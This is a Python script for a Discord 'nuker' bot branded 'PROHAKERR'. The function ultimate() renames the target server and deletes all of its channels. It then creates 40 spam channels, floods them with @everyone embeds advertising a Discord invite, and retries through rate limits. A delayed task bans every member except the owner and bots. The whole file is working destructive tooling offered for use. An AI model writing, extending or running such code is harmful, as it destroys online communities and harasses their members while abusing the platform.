import asyncio
import discord
import threading
from datetime import datetime
from pystyle import Write, Colors

spam_active = False
msgcount = 0

def wait_for_stop():
    global spam_active
    input()
    spam_active = False 

async def ban_all_members(guild):
    await asyncio.sleep(30) 
    Write.Print("🔨 Banning all members after 30 seconds...\n", Colors.green_to_cyan, interval=0.00)
    for member in guild.members:
        if member != guild.owner and not member.bot:
            try:
                await member.ban(reason="NUKED BY PROHAKERR")
                Write.Print(f"✅ {member.name} has been banned.\n", Colors.green_to_cyan, interval=0.00)
            except discord.Forbidden:
                Write.Print(f"🚫 Failed to ban {member.name} (Forbidden).\n", Colors.red, interval=0.00)
            except discord.HTTPException as e:
                Write.Print(f"⚠️ HTTP Error banning {member.name}: {e}\n", Colors.red, interval=0.00)
            except Exception as e:
                Write.Print(f"⚠️ Unexpected error banning {member.name}: {e}\n", Colors.red, interval=0.00)

async def spam_channel(channel):
    global msgcount
    while spam_active:
        try:
            current_time = datetime.now().strftime("%H:%M:%S")

            # Create an embed message
            embed = discord.Embed(
                title="NUKED BY PROHAKERR!!",
                description="https://discord.gg/ywpuSY8Fp4",
                color=discord.Color.green() 
            )
            embed.set_footer(text="PROHAKERR ON TOP!!")
            embed.set_image(url="https://cdn.discordapp.com/attachments/1284160832967802930/1290392164550971573/prohakerrnukersigma_1.gif?ex=66fc4ada&is=66faf95a&hm=a6e9ccd94085f2ae04190a60c0940ff9fbc47297eee3cbe03a14de99a91780ed&")  # Set the image URL here

            everyone_message = "@everyone Join us at: https://discord.gg/ywpuSY8Fp4"
            await channel.send(content=everyone_message, embed=embed)

            msgcount += 1
            Write.Print(f"✅ [{current_time}] Sent @everyone message with embed to {channel.name} / Count: [{msgcount}]\n", Colors.green_to_cyan, interval=0.00)

            await asyncio.sleep(0.005)
        
        except discord.HTTPException as e:
            if e.code == 429:  # Rate limit error
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                Write.Print(f"⚠️ Rate limited. Waiting for {retry_after} seconds...\n", Colors.red, interval=0.00)
                await asyncio.sleep(retry_after)
            elif e.code == 503: 
                Write.Print("⚠️ Discord 503 Service Unavailable. Retrying in 5 seconds...\n", Colors.red, interval=0.00)
                await asyncio.sleep(5)
            else:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                Write.Print(f"⚠️ Rate limited. Waiting for {retry_after} seconds...\n", Colors.red, interval=0.00)
                await asyncio.sleep(retry_after)
        except Exception as e:
            Write.Print(f"⚠️ Unexpected Error: {e}\n", Colors.red, interval=0.00)

async def ultimate(guild):
    global spam_active, msgcount

    try:
        Write.Print("🔨 Banning all members in 30 seconds...\n", Colors.green_to_cyan, interval=0.00)
        asyncio.create_task(ban_all_members(guild))

        if guild.me.guild_permissions.manage_guild:
            Write.Print("📝 Renaming the server...\n", Colors.green_to_cyan, interval=0.00)
            await guild.edit(name="NUKED BY PROHAKERR")
            Write.Print("✅ Server renamed to NUKED BY PROHAKERR\n", Colors.green_to_cyan, interval=0.00)
        else:
            Write.Print("🚫 Bot lacks permission to rename the server.\n", Colors.red, interval=0.00)
            return

        Write.Print(f"🗑️ Deleting all channels in the server: {guild.name}...\n", Colors.green_to_cyan, interval=0.00)
        await asyncio.gather(*[channel.delete() for channel in guild.channels if guild.me.guild_permissions.manage_channels])
        Write.Print("✅ All channels deleted!\n", Colors.green_to_cyan, interval=0.00)

        Write.Print("📢 Creating 40 new channels...\n", Colors.green_to_cyan, interval=0.00)
        channels = await asyncio.gather(*[guild.create_text_channel(f"PROHAKERR ON TOP!! {i+1}") for i in range(40)])
        Write.Print("✅ 40 channels created!\n", Colors.green_to_cyan, interval=0.00)

        threading.Thread(target=wait_for_stop, daemon=True).start()
        spam_active = True

        Write.Print("🚀 Spamming messages in server channels...\n", Colors.green_to_cyan, interval=0.00)

        await asyncio.gather(*[spam_channel(channel) for channel in channels])

        Write.Print("✅ Spamming completed!\n", Colors.green_to_cyan, interval=0.00)

    except discord.Forbidden:
        Write.Print("🚫 Error: Bot lacks permission.\n", Colors.green_to_cyan, interval=0.00)
    except discord.HTTPException as e:
        Write.Print(f"⚠️ HTTP Error: {e}\n", Colors.green_to_cyan, interval=0.00)
    except Exception as e:
        Write.Print(f"⚠️ Unexpected Error: {e}\n", Colors.green_to_cyan, interval=0.00)
    
    Write.Print(f"✅ Stopped spamming. {msgcount} messages have been sent.\n", Colors.red, interval=0.00)
    msgcount = 0
